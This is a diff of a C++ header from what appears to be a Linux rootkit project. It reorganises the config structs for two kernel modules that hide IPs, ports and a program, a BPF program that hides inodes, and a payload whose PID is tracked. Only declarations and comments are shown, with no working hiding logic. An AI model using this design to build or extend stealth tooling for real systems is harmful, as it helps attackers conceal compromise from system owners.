@@ -12,11 +12,19 @@
 
 namespace rootkit {
 
-struct KernelModuleConfig {
+struct RnetConfig {
     std::string module_path;
     std::string module_name;
     std::vector<std::pair<std::string, uint16_t>> ips_and_ports = {
     };
+};
+
+struct RtConfig {
+    std::string module_path;
+    std::string module_name;
+    // Params
+    std::string program_cwd;
+    std::string program_path;
 };
 
 struct RootkitBpfConfig {
@@ -35,7 +43,8 @@ private:
     bool is_config_ready;
     std::string config_path;
     pid_t payload_pid;
-    KernelModuleConfig kConf;
+    RnetConfig rnetConf;
+    RtConfig rtConf;
     RootkitBpfConfig bpfConf;
     PayloadConfig payloadConf;
 
@@ -68,23 +77,30 @@ public:
     void add_payload_pid(pid_t pid);
 
     /**
-    * @brief Returns config for kernel module. Set of ips and ports to hide.
-    * @return Return nullopt if reading of config file wasn't successful,
-    * otherwise return config
+    * @brief Returns config for rt kernel module.
+    * @return Returns nullopt if reading of config file wasn't successful,
+    * otherwise returns config
     */
-    std::optional<KernelModuleConfig> get_kernel_module_config();
+    std::optional<RtConfig> get_rt_config();
+
+    /**
+    * @brief Returns config for rnet kernel module. Set of ips and ports to hide.
+    * @return Returns nullopt if reading of config file wasn't successful,
+    * otherwise returns config
+    */
+    std::optional<RnetConfig> get_rnet_config();
 
     /**
     * @brief Returns config for bpf progrm, inodes to hide.
-    * @return Return nullopt if reading of config file wasn't successful,
-    * otherwise return config
+    * @return Returns nullopt if reading of config file wasn't successful,
+    * otherwise returns config
     */
     std::optional<RootkitBpfConfig> get_bpf_config();
 
     /**
     * @brief Returns config for payload
-    * @return Return nullopt if reading of config file wasn't successful,
-    * otherwise return config
+    * @return Returns nullopt if reading of config file wasn't successful,
+    * otherwise returns config
     */
     std::optional<PayloadConfig> get_payload_config();
 };
